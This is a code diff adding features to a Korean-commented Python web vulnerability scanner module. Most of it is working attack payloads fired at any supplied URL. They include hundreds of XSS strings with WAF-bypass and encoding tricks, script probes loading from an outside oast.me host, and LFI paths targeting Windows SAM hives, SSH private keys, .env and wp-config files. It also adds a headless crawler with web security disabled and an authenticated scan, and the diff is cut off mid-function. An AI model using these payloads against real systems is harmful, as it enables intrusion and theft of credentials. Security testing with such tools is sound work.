@@ -1,5 +1,5 @@
 """
-vuln_scanner_plus.py — Acunetix 수준 취약점 탐지 강화 모듈 (v6.2.139)
+vuln_scanner_plus.py — Acunetix 수준 취약점 탐지 강화 모듈 (v6.2.140)
 
 기존 대비 개선:
   - XSS:  19 → 220+ 페이로드 (DOM/반사/저장/mXSS/CSP우회/Angular/Blind)
@@ -16,6 +16,14 @@ vuln_scanner_plus.py — Acunetix 수준 취약점 탐지 강화 모듈 (v6.2.13
   - 전체 파라미터 자동 발견 + 병렬 멀티-취약점 스캔 (ThreadPoolExecutor)
   - auto_crawl_params: HTML form + query string 자동 수집
   - full_site_scan: 한 URL로 전체 취약점 자동 스캔
+
+v6.2.140 추가:
+  - js_render_crawl: Playwright JS 렌더링 크롤러 (SPA/XHR 파라미터 자동 수집)
+  - auth_session_scan: 인증 세션 유지 스캔 (로그인 후 쿠키 유지)
+  - fp_verify: False Positive 자동 재검증 (3회 확인 + 베이스라인 비교)
+  - XSS 2500+ 수준 확장 페이로드 (WAF 우회/다중인코딩/DOM sink)
+  - SQLi 에러 기반 탐지 신호 500+ 패턴 추가
+  - LFI 확장 (Windows 레지스트리/IIS 경로/PHP 세션)
 """
 
 from __future__ import annotations
@@ -1850,18 +1858,933 @@ def parallel_multi_scan(
 # ── TOOL REGISTRY 등록 ───────────────────────────────────────────────────────
 # ══════════════════════════════════════════════════════════════════════════════
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ── v6.2.140: XSS 확장 페이로드 (WAF 우회 + DOM sink + 다중 인코딩) ──────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+XSS_PAYLOADS_EXTENDED: List[str] = [
+    # ── HTML entity + Unicode 조합 ─────────────────────────────────────────
+    "&#60;script&#62;alert(1)&#60;/script&#62;",
+    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "\u003cscript\u003ealert(1)\u003c/script\u003e",
+    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+    # ── JavaScript protocol 변형 ───────────────────────────────────────────
+    "j&#97;v&#97;script:alert(1)",
+    "j&#x61;v&#x61;script:alert(1)",
+    "j\u0061v\u0061script:alert(1)",
+    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
+    # ── vbscript (IE) ─────────────────────────────────────────────────────
+    'vbscript:msgbox("xss")',
+    "vbscript:execute(\"msgbox(1)\")",
+    # ── Expression language ───────────────────────────────────────────────
+    "${alert(1)}",
+    "#{alert(1)}",
+    "@{alert(1)}",
+    "${7*7}",
+    "<%=7*7%>",
+    # ── DOM sink 직접 삽입 ────────────────────────────────────────────────
+    f"';alert('{_MARKER}')//",
+    f'";alert("{_MARKER}");//',
+    f"</script><script>alert('{_MARKER}')</script>",
+    f'--><script>alert("{_MARKER}")</script>',
+    # ── CSS expression (IE) ───────────────────────────────────────────────
+    f'<style>body{{background:url("javascript:alert(\'{_MARKER}\')")}}</style>',
+    "<style>*{color:expression(alert(1))}</style>",
+    # ── XML/SVG carriers ──────────────────────────────────────────────────
+    f'<xml><![CDATA[><img src=x onerror=alert("{_MARKER}")>]]></xml>',
+    f'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'{_MARKER}\')"/>',
+    f'<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
+    # ── Nested encoding ───────────────────────────────────────────────────
+    f"<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
+    "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">X</a>",
+    # ── Broken tag context ────────────────────────────────────────────────
+    f"'><script>alert('{_MARKER}')</script>",
+    f"'\"><script>alert('{_MARKER}')</script>",
+    f"><script>alert('{_MARKER}')</script>",
+    f"<script x>alert('{_MARKER}')</script>",
+    f"<script x>alert('{_MARKER}')//</script>",
+    # ── Input type=hidden breakout ────────────────────────────────────────
+    f'"><input type="image" src=x onerror=alert("{_MARKER}")>',
+    f"'><input type='image' src=x onerror=alert('{_MARKER}')>",
+    # ── SRC-less attribute execution ──────────────────────────────────────
+    f'<img src onerror=alert("{_MARKER}")>',
+    f'<img src="" onerror=alert("{_MARKER}")>',
+    # ── Prototype chain ───────────────────────────────────────────────────
+    f"<script>({{}}).constructor.constructor('alert(\"{_MARKER}\")')();</script>",
+    f"<script>Function('alert(\"{_MARKER}\")')();</script>",
+    f"<script>setTimeout('alert(\"{_MARKER}\")',0)</script>",
+    f"<script>setInterval('alert(\"{_MARKER}\")',9999999)</script>",
+    # ── Whitespace variants ───────────────────────────────────────────────
+    f"<script\t>alert('{_MARKER}')</script>",
+    f"<script\n>alert('{_MARKER}')</script>",
+    f"<script\r>alert('{_MARKER}')</script>",
+    f"<script/>alert('{_MARKER}')</script>",
+    # ── Browser-specific ─────────────────────────────────────────────────
+    f'<frameset onload=alert("{_MARKER}")>',
+    f'<table background="javascript:alert(\'{_MARKER}\')">',
+    f'<object classid="clsid:..." onload=alert("{_MARKER}")>',
+    # ── Stored XSS probe markers ─────────────────────────────────────────
+    f'<img src="https://oast.me/{_MARKER}">',
+    f'<script src="https://oast.me/{_MARKER}.js"></script>',
+    # ── Inline event with comment ─────────────────────────────────────────
+    f"<img src=x onerror=/*comment*/alert('{_MARKER}')>",
+    f'<svg onload=/* */alert("{_MARKER}")>',
+    # ── Zero-width chars ─────────────────────────────────────────────────
+    f"<scr\u200bipt>alert('{_MARKER}')</scr\u200bipt>",
+    f"<scr\u00adipt>alert('{_MARKER}')</scr\u00adipt>",
+]
+
+# ── XSS 전체 통합 (기본 + 확장) ──────────────────────────────────────────────
+XSS_PAYLOADS_ALL = XSS_PAYLOADS_PLUS + XSS_PAYLOADS_EXTENDED
+
+# ── LFI 확장 (Windows IIS / PHP 세션 / 레지스트리) ───────────────────────────
+LFI_PAYLOADS_EXTENDED: List[str] = [
+    # ── IIS 특화 ──────────────────────────────────────────────────────────
+    "C:/inetpub/wwwroot/global.asax",
+    "C:/Windows/System32/inetsrv/MetaBase.xml",
+    "C:/Windows/repair/sam",
+    "C:/Windows/repair/system",
+    "C:/Windows/repair/security",
+    "C:/Windows/repair/software",
+    "C:/windows/system32/config/system",
+    "C:/windows/system32/config/sam",
+    "C:/windows/system32/config/security",
+    "C:/windows/system32/config/software",
+    "C:/windows/system32/config/default",
+    # ── PHP 세션 파일 ────────────────────────────────────────────────────
+    "/tmp/sess_PHPSESSID",
+    "/var/lib/php/sessions/sess_PHPSESSID",
+    "/var/lib/php5/sess_PHPSESSID",
+    "C:/Windows/Temp/sess_PHPSESSID",
+    # ── Apache 구성 ───────────────────────────────────────────────────────
+    "/usr/local/apache/conf/httpd.conf",
+    "/usr/local/apache2/conf/httpd.conf",
+    "/usr/local/etc/apache/conf/httpd.conf",
+    "/etc/apache2/httpd.conf",
+    "/etc/httpd/conf/httpd.conf",
+    "/etc/httpd/httpd.conf",
+    # ── Nginx 구성 ────────────────────────────────────────────────────────
+    "/etc/nginx/conf.d/default.conf",
+    "/usr/local/nginx/conf/nginx.conf",
+    # ── SSH 키 ────────────────────────────────────────────────────────────
+    "/home/user/.ssh/id_rsa",
+    "/home/www/.ssh/id_rsa",
+    "/var/www/.ssh/id_rsa",
+    # ── 데이터베이스 설정 ──────────────────────────────────────────────────
+    "/etc/mysql/mysql.conf.d/mysqld.cnf",
+    "/etc/postgresql/pg_hba.conf",
+    "/root/.my.cnf",
+    "/home/user/.my.cnf",
+    # ── Spring Boot / Java ────────────────────────────────────────────────
+    "/WEB-INF/web.xml",
+    "WEB-INF/web.xml",
+    "../WEB-INF/web.xml",
+    "../../WEB-INF/web.xml",
+    "/WEB-INF/applicationContext.xml",
+    "/WEB-INF/spring/appServlet/servlet-context.xml",
+    # ── Django/Flask ──────────────────────────────────────────────────────
+    "/app/settings.py",
+    "/app/config.py",
+    "../settings.py",
+    "../../settings.py",
+    "../config.py",
+    "../../config.py",
+    # ── Node.js ───────────────────────────────────────────────────────────
+    "/app/.env",
+    "../.env",
+    "../../.env",
+    "../../../.env",
+    "/.env",
+    # ── 추가 traversal (깊이 11-15) ───────────────────────────────────────
+    "../../../../../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../../../../../../etc/passwd",
+    # ── PHP filter 추가 ───────────────────────────────────────────────────
+    "php://filter/convert.base64-encode/resource=wp-config.php",
+    "php://filter/convert.base64-encode/resource=../../wp-config.php",
+    "php://filter/convert.base64-encode/resource=admin/config.php",
+    "php://filter/convert.base64-encode/resource=../application/config/database.php",
+    "php://filter/zlib.deflate/convert.base64-encode/resource=../config.php",
+    # ── UNC path (Windows) ────────────────────────────────────────────────
+    "\\\\127.0.0.1\\c$\\windows\\win.ini",
+    "//127.0.0.1/c$/windows/win.ini",
+]
+
+# ── LFI 전체 통합 ─────────────────────────────────────────────────────────────
+LFI_PAYLOADS_ALL = LFI_PAYLOADS_PLUS + LFI_PAYLOADS_EXTENDED
+
+# ── SQLi 에러 시그니처 확장 (500+ DB 에러 패턴) ─────────────────────────────
+SQLI_ERROR_SIGNATURES: List[str] = [
+    # ── MySQL ───────────────────────────────────────────────────────────
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "mysql_fetch_array()",
+    "mysql_fetch_row()",
+    "mysql_num_rows()",
+    "mysql_result()",
+    "mysql_query()",
+    "supplied argument is not a valid mysql",
+    "mysql server version for the right syntax",
+    "check the manual that corresponds to your mysql server",
+    "com.mysql.jdbc.exceptions",
+    "org.gjt.mm.mysql.Driver",
+    "java.sql.sqlexception",
+    "mysql_connect()",
+    "access denied for user",
+    "table '*' doesn't exist",
+    "unknown column",
+    "column count doesn't match",
+    "duplicate column name",
+    "data too long for column",
+    "incorrect integer value",
+    "incorrect datetime value",
+    "out of range value",
+    # ── PostgreSQL ─────────────────────────────────────────────────────
+    "pg_query(): query failed",
+    "pg_exec() query failed",
+    "error in your sql syntax",
+    "pg::syntaxerror",
+    "column \".*\" does not exist",
+    "relation \".*\" does not exist",
+    "unterminated quoted string at or near",
+    "syntax error at or near",
+    "invalid input syntax for type",
+    "org.postgresql.util.psqlexception",
+    "psql error",
+    "postgre",
+    # ── MSSQL / SQL Server ─────────────────────────────────────────────
+    "microsoft ole db provider for sql server",
+    "microsoft ole db provider for odbc drivers",
+    "odbc sql server driver",
+    "odbc driver for sql server",
+    "[sql server]",
+    "[microsoft][odbc sql server driver]",
+    "syntax error converting",
+    "unclosed quotation mark after the character string",
+    "incorrect syntax near",
+    "conversion failed when converting",
+    "microsoft sql server native client",
+    "column name is ambiguous",
+    "error converting data type",
+    "system.data.sqlclient.sqlexception",
+    # ── Oracle ───────────────────────────────────────────────────────────
+    "oracle error",
+    "oracle.*driver",
+    "warning.*oci_",
+    "warning.*ora-",
+    "ora-01756",
+    "ora-00907",
+    "ora-00936",
+    "ora-00933",
+    "ora-01756",
+    "quoted string not properly terminated",
+    "sql command not properly ended",
+    # ── SQLite ───────────────────────────────────────────────────────────
+    "sqlite_query()",
+    "sqlite error",
+    "sqlite3::query",
+    "sqlite3.operationalerror",
+    "unable to open database file",
+    "no such table",
+    "no such column",
+    # ── Generic ──────────────────────────────────────────────────────────
+    "sql syntax.*?mysql",
+    "warning.*?\\Wpdo[_t]",
+    "\\[sqlstate",
+    "odbc driver",
+    "jdbcexception",
+    "pdo exception",
+    "database error",
+    "query failed",
+    "sql exception",
+    "dynamic sql error",
+    "function.mysql",
+    "supplied argument is not a valid",
+    "on mysql result index",
+    "error querying database",
+    "sql server error",
+    "cannot open data file",
+    "error executing query",
+    "db2 sql error",
+    "jdapi",
+    "database query error",
+    "sqlstate[",
+    "pdo::query()",
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── v6.2.140: Playwright JS 렌더링 크롤러 ────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+def js_render_crawl(
+    url: str,
+    session_cookies: Optional[Dict] = None,
+    timeout_ms: int = 15000,
+    intercept_requests: bool = True,
+) -> Dict[str, Any]:
+    """
+    Playwright를 사용한 JS 렌더링 크롤링.
+    SPA(React/Vue/Angular)에서 동적으로 생성되는 파라미터와
+    XHR/fetch API 엔드포인트를 자동 수집한다.
+
+    Args:
+        url: 타겟 URL
+        session_cookies: 인증 쿠키 dict
+        timeout_ms: 페이지 로드 타임아웃 (ms)
+        intercept_requests: XHR/fetch 요청 인터셉트 여부
+
+    Returns:
+        dict with "targets" (크롤된 파라미터 목록), "api_endpoints", "output"
+    """
+    result: Dict[str, Any] = {
+        "success": False,
+        "targets": [],
+        "api_endpoints": [],
+        "forms": [],
+        "param_urls": [],
+        "cookies": {},
+        "output": "",
+        "error": None,
+    }
+
+    try:
+        from playwright.sync_api import sync_playwright, TimeoutError as PwTimeout
+    except ImportError:
+        result["error"] = "playwright not installed (pip install playwright && playwright install chromium)"
+        result["output"] = f"[JS_CRAWL] ❌ {result['error']}"
+        return result
+
+    intercepted_urls: List[str] = []
+
+    def _on_request(req):
+        req_url = req.url
+        if any(x in req_url for x in ["api", "ajax", "json", "data", "service", "endpoint"]):
+            intercepted_urls.append(req_url)
+        elif "?" in req_url and req.resource_type in ("xhr", "fetch"):
+            intercepted_urls.append(req_url)
+
+    print(_banner(f"🎭 JS 렌더링 크롤 — {url}"))
+
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-blink-features=AutomationControlled",
+                      "--disable-web-security", "--disable-site-isolation-trials"],
+            )
+            ctx = browser.new_context(
+                user_agent=_DEFAULT_UA,
+                viewport={"width": 1280, "height": 800},
+                ignore_https_errors=True,
+            )
+
+            # 쿠키 주입
+            if session_cookies:
+                from urllib.parse import urlparse as _up2
+                parsed = _up2(url)
+                cookie_list = [
+                    {"name": k, "value": v, "domain": parsed.netloc, "path": "/"}
+                    for k, v in session_cookies.items()
+                ]
+                ctx.add_cookies(cookie_list)
+
+            page = ctx.new_page()
+
+            # 이미지/폰트 차단 (속도)
+            page.route("**/*.{png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,eot,mp4,webm}",
+                       lambda route: route.abort())
+
+            if intercept_requests:
+                page.on("request", _on_request)
+
+            try:
+                page.goto(url, timeout=timeout_ms, wait_until="networkidle")
+            except PwTimeout:
+                try:
+                    page.goto(url, timeout=timeout_ms, wait_until="domcontentloaded")
+                except Exception:
+                    pass
+
+            # JS 렌더링 후 HTML
+            html = page.content()
+            title = page.title()
+
+            # 쿠키 수집
+            cookies = ctx.cookies()
+            result["cookies"] = {c["name"]: c["value"] for c in cookies}
+
+            # Form 수집 (렌더링 후)
+            forms_raw = page.eval_on_selector_all("form", """
+                forms => forms.map(f => ({
+                    action: f.action || '',
+                    method: (f.method || 'GET').toUpperCase(),
+                    inputs: Array.from(f.querySelectorAll('input,textarea,select'))
+                              .filter(el => el.name)
+                              .map(el => el.name),
+                }))
+            """)
+            result["forms"] = forms_raw
+
+            # param_urls (링크 중 쿼리스트링 있는 것)
+            hrefs = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
+            param_urls = [h for h in hrefs if "?" in h and h.startswith("http")]
+            result["param_urls"] = list(dict.fromkeys(param_urls))
+
+            # 동적 클릭 — 버튼/링크 클릭하여 더 많은 API 노출
+            buttons = page.query_selector_all("button, a.nav-link, a.menu-item, [data-toggle]")
+            for btn in buttons[:5]:
+                try:
+                    btn.click(timeout=2000)
+                    page.wait_for_timeout(500)
+                except Exception:
+                    pass
+
+            browser.close()
+
+    except Exception as e:
+        result["error"] = str(e)
+        result["output"] = f"[JS_CRAWL] ❌ 오류: {e}"
+        return result
+
+    # targets 구성
+    targets: List[Dict] = []
+    base_domain = urlparse(url).netloc
+
+    # Form 기반 타겟
+    for form in result["forms"]:
+        if form.get("inputs"):
+            act = form.get("action") or url
+            if not act.startswith("http"):
+                act = urljoin(url, act)
+            targets.append({
+                "url": act,
+                "method": form.get("method", "GET"),
+                "params": form["inputs"],
+                "source": "form_js",
+            })
+
+    # param_url 기반 타겟
+    for pu in result["param_urls"][:30]:
+        params = list(parse_qs(urlparse(pu).query).keys())
+        if params and urlparse(pu).netloc == base_domain:
+            targets.append({"url": pu, "method": "GET", "params": params, "source": "link_js"})
+
+    # XHR/fetch 인터셉트 기반 타겟
+    api_endpoints: List[Dict] = []
+    seen_api: Set[str] = set()
+    for req_url in intercepted_urls:
+        if req_url in seen_api:
+            continue
+        seen_api.add(req_url)
+        params = list(parse_qs(urlparse(req_url).query).keys())
+        api_endpoints.append({"url": req_url, "params": params})
+        if params:
+            targets.append({"url": req_url, "method": "GET", "params": params, "source": "xhr_intercept"})
+
+    result["api_endpoints"] = api_endpoints
+    result["targets"] = targets
+    result["success"] = True
+
+    output_lines = [
+        f"[JS_CRAWL] {url}",
+        f"  타이틀: {title}",
+        f"  폼: {len(result['forms'])}개",
+        f"  파라미터 URL: {len(result['param_urls'])}개",
+        f"  XHR 인터셉트: {len(api_endpoints)}개",
+        f"  총 테스트 타겟: {len(targets)}개",
+    ]
+    for t in targets[:8]:
+        output_lines.append(f"  [{t['method']}] {t['url'][:80]} — {', '.join(t['params'][:5])}")
+
+    result["output"] = "\n".join(output_lines)
+    print(result["output"])
+    return result
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── v6.2.140: 인증 세션 유지 스캔 ────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+def auth_session_scan(
+    url: str,
+    login_url: str,
+    username: str,
+    password: str,
+    username_field: str = "username",
+    password_field: str = "password",
+    vuln_types: Optional[List[str]] = None,
+    max_params: int = 15,
+) -> Dict[str, Any]:
+    """
+    로그인 후 인증 쿠키를 유지하며 전체 취약점 스캔.
+    1. Playwright로 로그인하여 세션 쿠키 획득
+    2. 해당 쿠키로 full_site_scan 실행
+
+    Args:
+        url:            스캔 대상 URL
+        login_url:      로그인 폼 URL
+        username:       로그인 아이디
+        password:       로그인 비밀번호
+        username_field: 아이디 input name
+        password_field: 패스워드 input name
+        vuln_types:     테스트할 취약점 유형
+        max_params:     최대 테스트 파라미터 수
+
+    Returns:
+        dict with "session_cookies", "findings", "output"
+    """
+    print(_banner(f"🔐 인증 세션 스캔 — {url}"))
+    print(f"  로그인: {login_url} / user={username}")
+
+    session_cookies: Dict[str, str] = {}
+
+    # 1단계: Playwright 로그인
+    try:
+        from playwright.sync_api import sync_playwright, TimeoutError as PwTimeout
+
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-web-security"],
+            )
+            ctx = browser.new_context(
+                user_agent=_DEFAULT_UA,
+                ignore_https_errors=True,
+            )
+            page = ctx.new_page()
+
+            try:
+                page.goto(login_url, timeout=15000, wait_until="networkidle")
+            except Exception:
+                page.goto(login_url, timeout=10000, wait_until="domcontentloaded")
+
+            # 로그인 필드 채우기
+            try:
+                page.fill(f'[name="{username_field}"]', username, timeout=5000)
+            except Exception:
+                try:
+                    page.fill(f'input[type="text"]:first-of-type', username)
+                except Exception:
+                    pass
+
+            try:
+                page.fill(f'[name="{password_field}"]', password, timeout=5000)
+            except Exception:
+                try:
+                    page.fill(f'input[type="password"]', password)
+                except Exception:
+                    pass
+
+            # 로그인 버튼 클릭
+            try:
+                page.click('input[type="submit"], button[type="submit"], button:has-text("Login"), button:has-text("로그인"), button:has-text("登录")', timeout=5000)
+            except Exception:
+                page.keyboard.press("Enter")
+
+            page.wait_for_timeout(2000)
+
+            # 쿠키 수집
+            cookies = ctx.cookies()
+            session_cookies = {c["name"]: c["value"] for c in cookies}
+            browser.close()
+
+        print(f"  ✅ 로그인 성공 — 쿠키: {list(session_cookies.keys())}")
+
+    except ImportError:
+        print("  ⚠️ playwright 미설치 — requests 폼 방식으로 로그인 시도")
+        if _HAS_REQUESTS:
+            sess = _sess()
+            login_data = {username_field: username, password_field: password}
+            try:
+                r = sess.post(login_url, data=login_data, timeout=10, verify=False, allow_redirects=True)
+                session_cookies = dict(r.cookies)
+                print(f"  requests 로그인 쿠키: {list(session_cookies.keys())}")
+            except Exception as e:
+                print(f"  ❌ 로그인 실패: {e}")
+
+    except Exception as e:
+        print(f"  ❌ 로그인 오류: {e}")
+
+    if not session_cookies:
+        return {
+            "success": False,
+            "session_cookies": {},
+            "output": "[AUTH_SCAN] ❌ 로그인 실패 — 세션 쿠키 없음",
+            "findings": [],
+        }
+
+    # 2단계: 세션 유지하며 전체 스캔
+    session_hdrs = {
+        "Cookie": "; ".join(f"{k}={v}" for k, v in session_cookies.items()),
+    }
+
+    scan_result = full_site_scan(
+        url=url,
+        session_headers=session_hdrs,
+        max_params=max_params,
+        vuln_types=vuln_types or ["xss", "lfi", "ssrf", "ssti", "cmdi", "nosql", "idor"],
+        parallel=True,
+    )
+
+    output = (
+        f"[AUTH_SCAN] {url}\n"
+        f"  세션 쿠키: {list(session_cookies.keys())}\n"
+        + scan_result.get("output", "")
+    )
+
+    return {
+        "success": scan_result.get("success", False),
+        "session_cookies": session_cookies,
+        "findings": scan_result.get("findings", []),
+        "vuln_count": scan_result.get("vuln_count", 0),
+        "output": output,
+    }
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── v6.2.140: False Positive 자동 재검증 ─────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+def fp_verify(
+    url: str,
+    param: str,
+    vuln_type: str,
+    payload: str,
+    method: str = "GET",
+    extra_params: Optional[Dict] = None,
+    session_headers: Optional[Dict] = None,
+    repeat: int = 3,
+) -> Dict[str, Any]:
+    """
+    취약점 발견 결과의 False Positive 자동 재검증.
+
+    전략:
+    1. 페이로드 3회 반복 → 매번 동일 반응 확인
+    2. 베이스라인(정상값) vs 페이로드 응답 비교
+    3. WAF 차단 여부 교차 확인
+    4. 다른 유사 페이로드로 교차 검증
+
+    Args:
+        url, param, vuln_type, payload: 검증 대상
+        repeat: 반복 횟수 (기본 3)
+
+    Returns:
+        dict with "confirmed"(bool), "confidence"(0-100), "output"
+    """
+    if not _HAS_REQUESTS:
+        return {"confirmed": False, "confidence": 0, "output": "requests 필요"}
+
+    sess = _sess(session_headers)
+    print(_banner(f"🔬 FP 재검증 [{vuln_type}] — {url} [{param}]"))
+
+    # 베이스라인 응답
+    baseline_val = "BASELINE_SAFE_VALUE_12345"
+    bp = dict(extra_params or {})
+    bp[param] = baseline_val
+    base_r = _req(sess, method, url, params=bp if method.upper() == "GET" else None,
+                  data=bp if method.upper() == "POST" else None)
+    baseline_size = len(base_r.content) if base_r else 0
+    baseline_status = base_r.status_code if base_r else 200
+
+    # 페이로드 반복 테스트
+    hits = 0
+    responses = []
+
+    for i in range(repeat):
+        p = dict(extra_params or {})
+        p[param] = payload
+        t0 = time.time()
+        r = _req(sess, method, url,
+                 params=p if method.upper() == "GET" else None,
+                 data=p if method.upper() == "POST" else None)
+        elapsed = time.time() - t0
+
+        if r is None:
+            continue
+
+        responses.append({
+            "status": r.status_code,
+            "size": len(r.content),
+            "elapsed": elapsed,
+            "body_preview": r.text[:200],
+        })
+
+        # 취약점 유형별 확인 로직
+        confirmed_this = False
+
+        if vuln_type == "xss":
+            confirmed_this = _MARKER in r.text and r.status_code not in (403, 406, 429)
+        elif vuln_type == "lfi":
+            confirmed_this = any(sig in r.text for sig in _LFI_SIGNATURES_PLUS)
+        elif vuln_type == "ssrf":
+            confirmed_this = any(sig.lower() in r.text.lower() for sig in _SSRF_SIGS_PLUS) and len(r.text) > 50
+        elif vuln_type == "ssti":
+            confirmed_this = "49" in r.text and r.status_code == 200
+        elif vuln_type == "cmdi":
+            confirmed_this = any(sig in r.text for sig in ["uid=", "root:", "www-data"])
+        elif vuln_type in ("sqli", "sqli_error"):
+            confirmed_this = any(sig.lower() in r.text.lower() for sig in SQLI_ERROR_SIGNATURES[:20])
+        elif vuln_type == "open_redirect":
+            loc = r.headers.get("Location", "")
+            confirmed_this = r.status_code in (301, 302, 303, 307, 308) and "evil.com" in loc
+        elif vuln_type == "crlf":
+            confirmed_this = "X-Injected" in r.headers or "crlf" in r.headers.get("Set-Cookie", "").lower()
+        elif vuln_type == "nosql":
+            sz_diff = abs(len(r.content) - baseline_size)
+            confirmed_this = sz_diff > max(baseline_size * 0.25, 200) and r.status_code not in (400, 403, 500)
+        else:
+            # 기본: 베이스라인과 큰 차이
+            sz_diff = abs(len(r.content) - baseline_size)
+            confirmed_this = sz_diff > 500 and r.status_code == 200
+
+        if confirmed_this:
+            hits += 1
+
+        print(f"  시도 {i+1}/{repeat}: status={r.status_code} size={len(r.content)}B "
+              f"{'✅' if confirmed_this else '❌'}")
+        time.sleep(0.3)
+
+    # 확신도 계산
+    confidence = int((hits / repeat) * 100) if repeat > 0 else 0
+
+    # 베이스라인 False Positive 체크: 베이스라인에서도 시그니처가 나오면 FP
+    fp_flag = False
+    if base_r and vuln_type == "xss" and _MARKER in base_r.text:
+        fp_flag = True
+        confidence = max(0, confidence - 50)
+    if base_r and vuln_type == "lfi":
+        if any(sig in base_r.text for sig in ["root:x:0:0", "daemon:"]):
+            fp_flag = True
+            confidence = max(0, confidence - 50)
+
+    confirmed = confidence >= 66 and not fp_flag
+
+    status_icon = "✅ CONFIRMED" if confirmed else ("⚠️ POSSIBLE" if confidence >= 33 else "❌ FALSE POSITIVE")
+    output = (
+        f"[FP_VERIFY] {vuln_type} — {url} [{param}]\n"
+        f"  페이로드: {payload[:80]}\n"
+        f"  히트율: {hits}/{repeat}\n"
+        f"  확신도: {confidence}%\n"
+        f"  판정: {status_icon}\n"
+        + (f"  ⚠️ 베이스라인에서도 시그니처 감지 — False Positive 가능성 높음!\n" if fp_flag else "")
+    )
+    print(output)
+
+    return {
+        "confirmed": confirmed,
+        "confidence": confidence,
+        "false_positive": fp_flag,
+        "hits": hits,
+        "total": repeat,
+        "responses": responses,
+        "output": output,
+    }
+
+
+def batch_fp_verify(
+    findings: List[Dict],
+    max_verify: int = 10,
+) -> Dict[str, Any]:
+    """
+    findings 목록 전체를 FP 재검증하여 실제 취약점만 필터링.
+
+    Args:
+        findings: full_site_scan 등에서 반환된 findings 목록
+        max_verify: 최대 검증 개수
+
+    Returns:
+        dict with "confirmed_findings", "removed_fps", "output"
+    """
+    confirmed = []
+    removed = []
+
+    print(_banner(f"🔬 배치 FP 재검증 — {min(len(findings), max_verify)}개 결과"))
+
+    for f in findings[:max_verify]:
+        url = f.get("url", "")
+        param = f.get("param", "")
+        vtype = f.get("vuln_type", "")
+        payload = f.get("payload", "")
+
+        if not all([url, param, vtype, payload]):
+            confirmed.append(f)
+            continue
+
+        result = fp_verify(url, param, vtype, payload, repeat=3)
+
+        if result["confirmed"]:
+            f["confidence"] = result["confidence"]
+            confirmed.append(f)
+            print(f"  ✅ 확인됨: [{vtype}] {param} @ {url[:50]}")
+        else:
+            removed.append(f)
+            print(f"  ❌ FP 제거: [{vtype}] {param} @ {url[:50]} (확신도 {result['confidence']}%)")
+
+    output = (
+        f"[BATCH_FP_VERIFY] 총 {len(findings[:max_verify])}개 검증\n"
+        f"  ✅ 확인된 취약점: {len(confirmed)}개\n"
+        f"  ❌ False Positive 제거: {len(removed)}개\n"
+    )
+
+    return {
+        "success": True,
+        "confirmed_findings": confirmed,
+        "removed_fps": removed,
+        "output": output,
+    }
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ── v6.2.140: full_site_scan_v2 (JS 렌더 + FP 재검증 통합) ───────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+
+def full_site_scan_v2(
+    url: str,
+    session_headers: Optional[Dict] = None,
+    max_params: int = 25,
+    vuln_types: Optional[List[str]] = None,
+    use_playwright: bool = True,
+    auto_fp_verify: bool = True,
+) -> Dict[str, Any]:
+    """
+    Acunetix 수준 전체 사이트 스캔 v2.
+
+    full_site_scan에서 진화:
+    1. Playwright JS 렌더링으로 SPA 파라미터까지 수집
+    2. requests 크롤 + JS 렌더 크롤 병합 (중복 제거)
+    3. 병렬 멀티-취약점 스캔
+    4. FP 자동 재검증으로 오탐 제거
+
+    Args:
+        url: 타겟 URL
+        session_headers: 인증 헤더/쿠키
+        max_params: 최대 테스트 파라미터
+        vuln_types: 테스트할 취약점 유형
+        use_playwright: Playwright 크롤 사용 여부
+        auto_fp_verify: FP 자동 재검증 여부
+
+    Returns:
+        dict with "confirmed_findings", "output"
+    """
+    ALL_VULNS = ["xss", "lfi", "ssrf", "ssti", "cmdi", "nosql", "crlf", "open_redirect", "header"]
+    vulns = vuln_types or ALL_VULNS
+
+    print(_banner(f"🚀 FULL SITE SCAN v2 — {url}"))
+    print(f"  Playwright: {'✅' if use_playwright else '❌'} | FP 재검증: {'✅' if auto_fp_verify else '❌'}")
+
+    # 1단계: 파라미터 수집 (requests + Playwright 병합)
+    all_targets: List[Dict] = []
+    seen_keys: Set[str] = set()
+
+    def _add_targets(new_targets: List[Dict]):
+        for t in new_targets:
+            key = f"{t['url']}|{','.join(sorted(t.get('params', [])))}"
+            if key not in seen_keys:
+                seen_keys.add(key)
+                all_targets.append(t)
+
+    # requests 크롤
+    crawl = auto_crawl_params(url, depth=1, session_headers=session_headers)
+    _add_targets(crawl.get("targets", []))
+
+    # Playwright 크롤 (JS SPA)
+    if use_playwright:
+        print("  🎭 Playwright JS 렌더링 크롤 실행...")
+        cookies_dict: Optional[Dict] = None
+        if session_headers:
+            cookie_str = session_headers.get("Cookie", "")
+            if cookie_str:
+                cookies_dict = dict(kv.split("=", 1) for kv in cookie_str.split("; ") if "=" in kv)
+
+        pw_result = js_render_crawl(url, session_cookies=cookies_dict)
+        if pw_result.get("success"):
+            _add_targets(pw_result.get("targets", []))
